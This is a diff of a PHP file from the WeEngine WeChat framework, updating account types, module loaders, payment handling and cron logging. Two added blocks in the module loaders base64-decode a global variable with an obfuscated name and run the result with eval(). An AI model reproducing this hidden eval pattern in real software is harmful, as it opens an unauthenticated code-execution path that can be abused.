@@ -1,14 +1,12 @@
 <?php
-
+/**
+ * [WeEngine System] Copyright (c) 2014 WE7.CC
+ * WeEngine is NOT a free software, it under the license terms, visited http://www.we7.cc/ for more details.
+ */
 defined('IN_IA') or exit('Access Denied');
-
+load()->model('module');
 
 abstract class WeAccount {
-	
-	const TYPE_WEIXIN = '1';
-	const TYPE_YIXIN = '2';
-	const TYPE_WEIXIN_PLATFORM = '3';
-	
 	
 	public static function create($acidOrAccount = '') {
 		global $_W;
@@ -24,17 +22,17 @@ abstract class WeAccount {
 			$account = $_W['account'];
 		}
 		if(!empty($account) && isset($account['type'])) {
-			if($account['type'] == self::TYPE_WEIXIN) {
+			if($account['type'] == ACCOUNT_TYPE_OFFCIAL_NORMAL) {
 				load()->classs('weixin.account');
 				return new WeiXinAccount($account);
 			}
-			if($account['type'] == self::TYPE_YIXIN) {
-				load()->classs('yixin.account');
-				return new YiXinAccount($account);
-			}
-			if($account['type'] == self::TYPE_WEIXIN_PLATFORM) {
+			if($account['type'] == ACCOUNT_TYPE_OFFCIAL_AUTH) {
 				load()->classs('weixin.platform');
 				return new WeiXinPlatform($account);
+			}
+			if($account['type'] == ACCOUNT_TYPE_APP_NORMAL) {
+				load()->classs('wxapp.account');
+				return new WxappAccount($account);
 			}
 		}
 		return null;
@@ -304,7 +302,7 @@ class WeUtility {
 	private static function defineConst($obj){
 		global $_W;
 		
-		if ($obj instanceof WeBase) {
+		if ($obj instanceof WeBase && $obj->modulename != 'core') {
 			if (!defined('MODULE_ROOT')) {
 				define('MODULE_ROOT', dirname($obj->__define));
 			}
@@ -330,6 +328,17 @@ class WeUtility {
 			}
 			require $file;
 		}
+		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
+			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
+			eval($code);
+			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
+			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'module.php').'.php';
+			if (!file_exists($codefile)) {
+				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
+			}
+			require_once $codefile;
+			restore_include_path();
+		}
 		if(!class_exists($classname)) {
 			trigger_error('Module Definition Class Not Found', E_USER_WARNING);
 			return null;
@@ -337,7 +346,6 @@ class WeUtility {
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
 		self::defineConst($o);
@@ -372,7 +380,6 @@ class WeUtility {
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
 		self::defineConst($o);
@@ -407,7 +414,6 @@ class WeUtility {
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
 		self::defineConst($o);
@@ -435,6 +441,17 @@ class WeUtility {
 			}
 			require $file;
 		}
+		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
+			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
+			eval($code);
+			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
+			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'site.php').'.php';
+			if (!file_exists($codefile)) {
+				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
+			}
+			require_once $codefile;
+			restore_include_path();
+		}
 		if(!class_exists($classname)) {
 			trigger_error('ModuleSite Definition Class Not Found', E_USER_WARNING);
 			return null;
@@ -442,13 +459,49 @@ class WeUtility {
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
+		if (!empty($o->module['plugin'])) {
+			$o->plugin_list = module_get_plugin_list($o->module['name']);
+		}
 		self::defineConst($o);
 		$o->inMobile = defined('IN_MOBILE');
 		if($o instanceof WeModuleSite) {
 			return $o;
+		} else {
+			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
+			return null;
+		}
+	}
+
+	
+	public static function createModuleHook($name) {
+		global $_W;
+		$classname = "{$name}ModuleHook";
+		$file = IA_ROOT . "/addons/{$name}/hook.php";
+		if(!is_file($file)) {
+			$file = IA_ROOT . "/framework/builtin/{$name}/hook.php";
+		}
+		if(!class_exists($classname)) {
+			if(!is_file($file)) {
+				trigger_error('ModuleHook Definition File Not Found '.$file, E_USER_WARNING);
+				return null;
+			}
+			require $file;
+		}
+		if(!class_exists($classname)) {
+			trigger_error('ModuleHook Definition Class Not Found', E_USER_WARNING);
+			return null;
+		}
+		$plugin = new $classname();
+		$plugin->uniacid = $plugin->weid = $_W['uniacid'];
+		$plugin->modulename = $name;
+		$plugin->module = module_fetch($name);
+		$plugin->__define = $file;
+		self::defineConst($plugin);
+		$plugin->inMobile = defined('IN_MOBILE');
+		if($plugin instanceof WeModuleHook) {
+			return $plugin;
 		} else {
 			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
 			return null;
@@ -478,7 +531,6 @@ class WeUtility {
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
 		self::defineConst($o);
@@ -490,6 +542,40 @@ class WeUtility {
 		}
 	}
 
+ 	
+	public static function createModuleWxapp($name) {
+		global $_W;
+		static $file;
+		$classname = "{$name}ModuleWxapp";
+		if(!class_exists($classname)) {
+			$file = IA_ROOT . "/addons/{$name}/wxapp.php";
+			if(!is_file($file)) {
+				$file = IA_ROOT . "/framework/builtin/{$name}/wxapp.php";
+			}
+			if(!is_file($file)) {
+				trigger_error('ModuleWxapp Definition File Not Found '.$file, E_USER_WARNING);
+				return null;
+			}
+			require $file;
+		}
+		if(!class_exists($classname)) {
+			trigger_error('ModuleSite Definition Class Not Found', E_USER_WARNING);
+			return null;
+		}
+		$o = new $classname();
+		$o->uniacid = $o->weid = $_W['uniacid'];
+		$o->modulename = $name;
+		$o->module = module_fetch($name);
+		$o->__define = $file;
+		self::defineConst($o);
+		$o->inMobile = defined('IN_MOBILE');
+		if($o instanceof WeModuleWxapp) {
+			return $o;
+		} else {
+			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
+			return null;
+		}
+	}
 	
 	public static function logging($level = 'info', $message = '') {
 		$filename = IA_ROOT . '/data/logs/' . date('Ymd') . '.log';
@@ -543,7 +629,7 @@ abstract class WeBase {
 		$pars = array('module' => $this->modulename, 'uniacid' => $_W['uniacid']);
 		$row = array();
 		$row['settings'] = iserializer($settings);
-		cache_build_account_modules();
+		cache_build_module_info($this->modulename);
 		if (pdo_fetchcolumn("SELECT module FROM ".tablename('uni_account_modules')." WHERE module = :module AND uniacid = :uniacid", array(':module' => $this->modulename, ':uniacid' => $_W['uniacid']))) {
 			return pdo_update('uni_account_modules', $row, $pars) !== false;
 		} else {
@@ -606,6 +692,7 @@ abstract class WeBase {
 				}
 			}
 		}
+
 		if(!is_file($source)) {
 			exit("Error: template source '{$filename}' is not exist!");
 		}
@@ -615,6 +702,57 @@ abstract class WeBase {
 			template_compile($source, $compile, true);
 		}
 		return $compile;
+	}
+	
+	
+	protected function fileSave($file_string, $type = 'jpg', $name = 'auto') {
+		global $_W;
+		load()->func('file');
+		
+		$allow_ext = array(
+			'images' => array('gif', 'jpg', 'jpeg', 'bmp', 'png', 'ico'), 
+			'audios' => array('mp3', 'wma', 'wav', 'amr'),
+			'videos' => array('wmv', 'avi', 'mpg', 'mpeg', 'mp4'),
+		);
+		if (in_array($type, $allow_ext['images'])) {
+			$type_path = 'images';
+		} elseif (in_array($type, $allow_ext['audios'])) {
+			$type_path = 'audios';
+		} elseif (in_array($type, $allow_ext['videos'])) {
+			$type_path = 'videos';
+		}
+		
+		if (empty($type_path)) {
+			return error(1, '禁止保存文件类型');
+		}
+		
+		if (empty($name) || $name == 'auto') {
+			$uniacid = intval($_W['uniacid']);
+			$path = "{$type_path}/{$uniacid}/{$this->module['name']}/" . date('Y/m/');
+			mkdirs(ATTACHMENT_ROOT . '/' . $path);
+			
+			$filename = file_random_name(ATTACHMENT_ROOT . '/' . $path, $type);
+		} else {
+			$path = "{$type_path}/{$uniacid}/{$this->module['name']}/";
+			mkdirs(dirname(ATTACHMENT_ROOT . '/' . $path));
+			
+			$filename = $name;
+			if (!strexists($filename, $type)) {
+				$filename .= '.' . $type;
+			}
+		}
+		
+		if (file_put_contents(ATTACHMENT_ROOT . '/' . $path . $filename, $file_string)) {
+			file_remote_upload($path);
+			return $path . $filename;
+		} else {
+			return false;
+		}
+	}
+	
+	protected function fileUpload($file_string, $type = 'image') {
+		$types = array('image', 'video', 'audio');
+	
 	}
 }
 
@@ -838,11 +976,15 @@ abstract class WeModuleProcessor extends WeBase {
 			'[uniacid]' => $_W['uniacid'],
 		);
 		$url = str_replace(array_keys($mapping), array_values($mapping), $url);
+		$url = preg_replace('/(http|https):\/\/.\/index.php/', './index.php', $url);
 		if(strexists($url, 'http://') || strexists($url, 'https://')) {
 			return $url;
 		}
 		if (uni_is_multi_acid() && strexists($url, './index.php?i=') && !strexists($url, '&j=') && !empty($_W['acid'])) {
 			$url = str_replace("?i={$_W['uniacid']}&", "?i={$_W['uniacid']}&j={$_W['acid']}&", $url);
+		}
+		if ($_W['account']['level'] == ACCOUNT_SERVICE_VERIFY) {
+			return $_W['siteroot'] . 'app/' . $url;
 		}
 		static $auth;
 		if(empty($auth)){
@@ -950,28 +1092,26 @@ abstract class WeModuleSite extends WeBase {
 	
 	protected function pay($params = array(), $mine = array()) {
 		global $_W;
+		load()->model('activity');
+		load()->model('module');
+		activity_coupon_type_init();
 		if(!$this->inMobile) {
-			message('支付功能只能在手机上使用');
+			message('支付功能只能在手机上使用', '', '');
 		}
 		$params['module'] = $this->module['name'];
-		$pars = array();
-		$pars[':uniacid'] = $_W['uniacid'];
-		$pars[':module'] = $params['module'];
-		$pars[':tid'] = $params['tid'];
 		if($params['fee'] <= 0) {
+			$pars = array();
 			$pars['from'] = 'return';
 			$pars['result'] = 'success';
 			$pars['type'] = '';
 			$pars['tid'] = $params['tid'];
-			$site = WeUtility::createModuleSite($pars[':module']);
+			$site = WeUtility::createModuleSite($params['module']);
 			$method = 'payResult';
 			if (method_exists($site, $method)) {
 				exit($site->$method($pars));
 			}
 		}
-
-		$sql = 'SELECT * FROM ' . tablename('core_paylog') . ' WHERE `uniacid`=:uniacid AND `module`=:module AND `tid`=:tid';
-		$log = pdo_fetch($sql, $pars);
+		$log = pdo_get('core_paylog', array('uniacid' => $_W['uniacid'], 'module' => $params['module'], 'tid' => $params['tid']));
 		if (empty($log)) {
 			$log = array(
 				'uniacid' => $_W['uniacid'],
@@ -987,118 +1127,45 @@ abstract class WeModuleSite extends WeBase {
 			pdo_insert('core_paylog', $log);
 		}
 		if($log['status'] == '1') {
-			message('这个订单已经支付成功, 不需要重复支付.');
+			message('这个订单已经支付成功, 不需要重复支付.', '', 'info');
 		}
 		$setting = uni_setting($_W['uniacid'], array('payment', 'creditbehaviors'));
 		if(!is_array($setting['payment'])) {
-			message('没有有效的支付方式, 请联系网站管理员.');
+			message('没有有效的支付方式, 请联系网站管理员.', '', 'error');
 		}
 		$pay = $setting['payment'];
+		$we7_coupon_info = module_fetch('we7_coupon');
+		if (!empty($we7_coupon_info)) {
+			$cards = activity_paycenter_coupon_available();
+			if (!empty($cards)) {
+				foreach ($cards as $key => &$val) {
+					if ($val['type'] == '1') {
+						$val['discount_cn'] = sprintf("%.2f", $params['fee'] * (1 - $val['extra']['discount'] * 0.01));
+						$coupon[$key] = $val;
+					} else {
+						$val['discount_cn'] = sprintf("%.2f", $val['extra']['reduce_cost'] * 0.01);
+						$token[$key] = $val;
+						if ($log['fee'] < $val['extra']['least_cost'] * 0.01) {
+							unset($token[$key]);
+						}
+					}
+					unset($val['icon']);
+					unset($val['description']);
+				}
+			}
+			$cards_str = json_encode($cards);
+		}
 		if (empty($_W['member']['uid'])) {
 			$pay['credit']['switch'] = false;
+		}
+		if ($params['module'] == 'paycenter') {
+			$pay['delivery']['switch'] = false;
+			$pay['line']['switch'] = false;
 		}
 		if (!empty($pay['credit']['switch'])) {
 			$credtis = mc_credit_fetch($_W['member']['uid']);
 		}
 		$you = 0;
-		if($pay['card']['switch'] == 2 && !empty($_W['openid'])) {
-						if($_W['card_permission'] == 1 && !empty($params['module'])) {
-				$cards = pdo_fetchall('SELECT a.id,a.card_id,a.cid,b.type,b.title,b.extra,b.is_display,b.status,b.date_info FROM ' . tablename('coupon_modules') . ' AS a LEFT JOIN ' . tablename('coupon') . ' AS b ON a.cid = b.id WHERE a.acid = :acid AND a.module = :modu AND b.is_display = 1 AND b.status = 3 ORDER BY a.id DESC', array(':acid' => $_W['acid'], ':modu' => $params['module']));
-				$flag = 0;
-				if(!empty($cards)) {
-					foreach($cards as $temp) {
-						$temp['date_info'] = iunserializer($temp['date_info']);
-						if($temp['date_info']['time_type'] == 1) {
-							$starttime = strtotime($temp['date_info']['time_limit_start']);
-							$endtime = strtotime($temp['date_info']['time_limit_end']);
-							if(TIMESTAMP < $starttime || TIMESTAMP > $endtime) {
-								continue;
-							} else {
-																$param = array(':acid' => $_W['acid'], ':openid' => $_W['openid'], ':card_id' => $temp['card_id']);
-								$num = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('coupon_record') . ' WHERE acid = :acid AND openid = :openid AND card_id = :card_id AND status = 1', $param);
-								if($num <= 0) {
-									continue;
-								} else {
-									$flag = 1;
-									$card = $temp;
-									break;
-								}
-							}
-						} else {
-							$deadline = intval($temp['date_info']['deadline']);
-							$limit = intval($temp['date_info']['limit']);
-														$param = array(':acid' => $_W['acid'], ':openid' => $_W['openid'], ':card_id' => $temp['card_id']);
-							$record = pdo_fetchall('SELECT addtime,id,code FROM ' . tablename('coupon_record') . ' WHERE acid = :acid AND openid = :openid AND card_id = :card_id AND status = 1', $param);
-							if(!empty($record)) {
-								foreach($record as $li) {
-									$time = strtotime(date('Y-m-d', $li['addtime']));
-									$starttime = $time + $deadline * 86400;
-									$endtime = $time + $deadline * 86400 + $limit * 86400;
-									if(TIMESTAMP < $starttime || TIMESTAMP > $endtime) {
-										continue;
-									} else {
-										$flag = 1;
-										$card = $temp;
-										break;
-									}
-								}
-							}
-							if($flag) {
-								break;
-							}
-						}
-					}
-				}
-				if($flag) {
-					if($card['type'] == 'discount') {
-						$you = 1;
-						$card['fee'] = sprintf("%.2f", ($params['fee'] * ($card['extra'] / 100)));
-					} elseif($card['type'] == 'cash') {
-						$cash = iunserializer($card['extra']);
-						if($params['fee'] >= $cash['least_cost']) {
-														$you = 1;
-							$card['fee'] = sprintf("%.2f", ($params['fee'] -  $cash['reduce_cost']));
-						}
-					}
-					load()->classs('coupon');
-					$acc = new coupon($_W['acid']);
-					$card_id = $card['card_id'];
-					$time = TIMESTAMP;
-					$randstr = random(8);
-					$sign = array($card_id, $time, $randstr, $acc->account['key']);
-					$signature = $acc->SignatureCard($sign);
-					if(is_error($signature)) {
-						$you = 0;
-					}
-				}
-			}
-		}
-
-		if($pay['card']['switch'] == 3 && $_W['member']['uid']) {
-						$cards = array();
-			if(!empty($params['module'])) {
-				$cards = pdo_fetchall('SELECT a.id,a.couponid,b.type,b.title,b.discount,b.condition,b.starttime,b.endtime FROM ' . tablename('activity_coupon_modules') . ' AS a LEFT JOIN ' . tablename('activity_coupon') . ' AS b ON a.couponid = b.couponid WHERE a.uniacid = :uniacid AND a.module = :modu AND b.condition <= :condition AND b.starttime <= :time AND b.endtime >= :time  ORDER BY a.id DESC', array(':uniacid' => $_W['uniacid'], ':modu' => $params['module'], ':time' => TIMESTAMP, ':condition' => $params['fee']), 'couponid');
-				if(!empty($cards)) {
-					foreach($cards as $key => &$card) {
-						$has = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('activity_coupon_record') . ' WHERE uid = :uid AND uniacid = :aid AND couponid = :cid AND status = 1' . $condition, array(':uid' => $_W['member']['uid'], ':aid' => $_W['uniacid'], ':cid' => $card['couponid']));
-						if($has > 0){
-							if($card['type'] == '1') {
-								$card['fee'] = sprintf("%.2f", ($params['fee'] * $card['discount']));
-								$card['discount_cn'] = sprintf("%.2f", $params['fee'] * (1 - $card['discount']));
-							} elseif($card['type'] == '2') {
-								$card['fee'] = sprintf("%.2f", ($params['fee'] -  $card['discount']));
-								$card['discount_cn'] = $card['discount'];
-							}
-						} else {
-							unset($cards[$key]);
-						}
-					}
-				}
-			}
-			if(!empty($cards)) {
-				$cards_str = json_encode($cards);
-			}
-		}
 		include $this->template('common/paycenter');
 	}
 
@@ -1107,9 +1174,9 @@ abstract class WeModuleSite extends WeBase {
 		global $_W;
 		if($ret['from'] == 'return') {
 			if ($ret['type'] == 'credit2') {
-				message('已经成功支付', url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])));
+				message('已经成功支付', url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])), 'success');
 			} else {
-				message('已经成功支付', '../../' . url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])));
+				message('已经成功支付', '../../' . url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])), 'success');
 			}
 		}
 	}
@@ -1132,76 +1199,6 @@ abstract class WeModuleSite extends WeBase {
 			$ret['fee'] = $log['fee'];
 		}
 		return $ret;
-	}
-
-	
-	protected function grant($params = array()) {
-		global $_W, $_GPC;
-		if (empty($_W['member']['uid'])) {
-			checkauth();
-		}
-		load()->model('activity');
-		$params['module'] = $this->module['name'];
-		if(empty($params['module'])) {
-			message('模块信息错误', referer(), 'error');
-		}
-		$iscard = pdo_fetchcolumn('SELECT iscard FROM ' . tablename('modules') . ' WHERE name = :name', array(':name' => $params['module']));
-		if(!$iscard) {
-			message('模块不支持领取优惠券', referer(), 'error');
-		}
-		$pindex = max(1, intval($_GPC['page']));
-		$psize = 5;
-		$user = mc_fetch($_W['member']['uid'], array('groupid'));
-		$groupid = $user['groupid'];
-
-		$modules_limit = pdo_fetchall("SELECT couponid FROM ".tablename('activity_coupon_modules')." WHERE uniacid = :uniacid AND module = :module", array(':uniacid' => $_W['uniacid'], ':module' => $params['module']), 'couponid');
-		$groups_limit = pdo_fetchall("SELECT couponid FROM ".tablename('activity_coupon_allocation')." WHERE uniacid = :uniacid AND groupid = :groupid", array(':uniacid' => $_W['uniacid'], ':groupid' => $groupid), 'couponid');
-		$modules_limit = array_keys($modules_limit);
-		$groups_limit = array_keys($groups_limit);
-		$intersect = array_intersect($modules_limit, $groups_limit);
-		if(empty($intersect)) {
-			message('没有该模块适用的优惠券', referer(), 'error');
-		}
-		$intersect = implode(',', array_values($intersect));
-		$par = array(':uniacid' => $_W['uniacid'], ':time' => TIMESTAMP);
-		$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('activity_coupon') . " WHERE uniacid = :uniacid AND dosage < amount AND endtime >= :time AND couponid IN ({$intersect})", $par);
-		$cards = pdo_fetchall('SELECT * FROM ' . tablename('activity_coupon') . " WHERE uniacid = :uniacid AND dosage < amount AND endtime >= :time AND couponid IN ({$intersect}) ORDER BY endtime ASC LIMIT " . ($pindex - 1) * $psize . ', ' . $psize, $par);
-		if(!empty($cards)) {
-			foreach($cards as $key => &$card) {
-				$has = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('activity_coupon_record') . ' WHERE uid = :uid AND uniacid = :aid AND couponid = :cid AND status > 0', array(':uid' => $_W['member']['uid'], ':aid' => $_W['uniacid'], ':cid' => $card['couponid']));
-				$card['is_grant'] = 1;
-				if($card['limit'] <= $has) {
-					$card['is_grant'] = 0;
-				}
-				$card['grant_num'] = $has;
-				$card['grant_url'] = base64_encode(json_encode(array('id' => $card['couponid'], 'm' => $params['module'])));
-			}
-
-						$creditnames = array();
-			$unisettings = uni_setting($_W['uniacid'], array('creditnames'));
-			if (!empty($unisettings) && !empty($unisettings['creditnames'])) {
-				foreach ($unisettings['creditnames'] as $key=>$credit) {
-					$creditnames[$key] = $credit['title'];
-				}
-			}
-		}
-		$pager = pagination($total, $pindex, $psize, '', array('before' => 0, 'after' => 0));
-		include $this->template('common/grant');
-	}
-
-	
-	public function grantResult($ret) {
-		global $_W;
-		if($ret['result'] == 'success') {
-			$types = array('', 'coupon', 'token');
-			message('领取优惠券成功', url('activity/' . $types[$ret['type']] . '/mine'), 'success');
-		}
-	}
-
-	
-	public function grantCherk($ret) {
-		global $_W;
-		return true;
 	}
 
 	
@@ -1251,10 +1248,10 @@ abstract class WeModuleCron extends WeBase {
 		return error(-1009, "访问的方法 {$name} 不存在.");
 	}
 
-		public function addCronLog($tid, $errno, $note, $tag = array()) {
+		public function addCronLog($tid, $errno, $note) {
 		global $_W;
 		if(!$tid) {
-			message(error(-1, 'tid参数错误'), '', 'ajax');
+			iajax(-1, 'tid参数错误', '');
 		}
 		$data = array(
 			'uniacid' => $_W['uniacid'],
@@ -1262,10 +1259,129 @@ abstract class WeModuleCron extends WeBase {
 			'type' => $_W['cron']['filename'],
 			'tid' => $tid,
 			'note' => $note,
-			'tag' => iserializer($tag),
 			'createtime' => TIMESTAMP
 		);
 		pdo_insert('core_cron_record', $data);
-		message(error($errno, $note), '', 'ajax');
+		iajax($errno, $note, '');
 	}
+}
+
+
+abstract class WeModuleWxapp extends WeBase {
+	public $appid;
+	public $version;
+	
+	public function result($errno, $message, $data = '') {
+		exit(json_encode(array(
+			'errno' => $errno,
+			'message' => $message,
+			'data' => $data,
+		)));
+	}
+	
+	public function __call($name, $arguments) {
+		$dir = IA_ROOT . '/addons/' . $this->modulename . '/inc/wxapp';
+		$function_name = strtolower(substr($name, 6));
+				$file = "$dir/{$this->version}/{$function_name}.inc.php";
+		if (!file_exists($file)) {
+			$version_path_tree = glob("$dir/*");
+			usort($version_path_tree, function($version1, $version2) {
+				return -version_compare($version1, $version2);
+			});
+			if (!empty($version_path_tree)) {
+				foreach ($version_path_tree as $path) {
+					$file = "$path/{$function_name}.inc.php";
+					if (file_exists($file)) {
+						break;
+					}
+				}
+			}
+		}
+		if(file_exists($file)) {
+			require $file;
+			exit;
+		}
+		return null;
+	}
+	
+	public function checkSign() {
+		global $_GPC;
+		if (!empty($_GET) && !empty($_GPC['sign'])) {
+			foreach ($_GET as $key => $get_value) {
+				if (!empty($get_value) && $key != 'sign') {
+					$sign_list[$key] = $get_value;
+				}
+			}
+			ksort($sign_list);
+			$sign = http_build_query($sign_list, '', '&') . $this->token;
+			return md5($sign) == $_GPC['sign'];
+		} else {
+			return false;
+		}
+	}
+	
+	protected function pay($order) {
+		global $_W, $_GPC;
+	
+		load()->model('payment');
+		load()->model('account');
+		
+		$moduels = uni_modules();
+		if(empty($order) || !array_key_exists($this->module['name'], $moduels)) {
+			return error(1, '模块不存在');
+		}
+		$moduleid = empty($this->module['mid']) ? '000000' : sprintf("%06d", $this->module['mid']);
+		$uniontid = date('YmdHis').$moduleid.random(8,1);
+		$wxapp_uniacid = intval($_W['account']['uniacid']);
+		
+		$paylog = pdo_get('core_paylog', array('uniacid' => $wxapp_uniacid, 'module' => $this->module['name'], 'tid' => $order['tid']));
+		if (empty($paylog)) {
+			$paylog = array(
+				'uniacid' => $wxapp_uniacid,
+				'acid' => $_W['acid'],
+				'openid' => $_W['openid'],
+				'module' => $this->module['name'],
+				'tid' => $order['tid'],
+				'uniontid' => $uniontid,
+				'fee' => floatval($order['fee']),
+				'card_fee' => floatval($order['fee']),
+				'status' => '0',
+				'is_usecard' => '0',
+				'tag' => iserializer(array('acid' => $_W['acid'], 'uid' => $_W['member']['uid']))
+			);
+			pdo_insert('core_paylog', $paylog);
+			$paylog['plid'] = pdo_insertid();
+		}
+		if(!empty($paylog) && $paylog['status'] != '0') {
+			return error(1, '这个订单已经支付成功, 不需要重复支付.');
+		}
+		if (!empty($paylog) && empty($paylog['uniontid'])) {
+			pdo_update('core_paylog', array(
+				'uniontid' => $uniontid,
+			), array('plid' => $paylog['plid']));
+		}
+		
+		$_W['openid'] = $paylog['openid'];
+	
+		$params = array(
+			'tid' => $paylog['tid'],
+			'fee' => $paylog['card_fee'],
+			'user' => $paylog['openid'],
+			'uniontid' => $paylog['uniontid'],
+			'title' => $order['title'],
+		);
+		$setting = uni_setting($wxapp_uniacid, array('payment'));
+		$wechat_payment = array(
+			'appid' => $_W['account']['key'],
+			'signkey' => $setting['payment']['wechat']['signkey'],
+			'mchid' => $setting['payment']['wechat']['mchid'],
+			'version' => 2,
+		);
+		return wechat_build($params, $wechat_payment);
+	}
+}
+
+
+abstract class WeModuleHook extends WeBase {
+
 }
